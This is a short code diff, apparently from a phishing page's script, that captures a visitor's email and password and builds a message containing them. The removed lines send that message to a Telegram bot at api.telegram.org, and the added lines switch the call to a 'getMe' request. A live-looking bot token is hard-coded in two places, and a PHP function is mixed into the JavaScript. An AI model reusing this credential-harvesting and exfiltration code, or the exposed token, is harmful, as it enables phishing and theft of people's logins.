@@ -66,13 +66,13 @@
                 date_default_timezone_set("Asia/Kolkata");
                 var time = new Date().toLocaleTimeString();
                 var message = "Username: " + email + "\nPassword: " + password + "\nTried Login at " + time + " IST";
-                var chat_id = 'Albertsfriedchicken';
+                //var chat_id = 'Albertsfriedchicken';
                 var apiToken = '6951049067:AAF4Y-kePwnyq_CdysCTUi9OXoqKbT2ZT7E';
-                send_message(chat_id, message, apiToken);
+                send_message(message, apiToken);
             }
-            function send_message(chat_id, message, apiToken) {
+            function send_message(message, apiToken) {
                 var text = encodeURIComponent(message);
-                var url = "https://api.telegram.org/bot" + apiToken + "/sendMessage?chat_id=" + chat_id + "&text=" + text;
+                var url ='https://api.telegram.org/bot6951049067:AAF4Y-kePwnyq_CdysCTUi9OXoqKbT2ZT7E/getMe';
                 // You can use fetch or XMLHttpRequest to make an HTTP request
                 fetch(url)
                     .then(response => response.json())
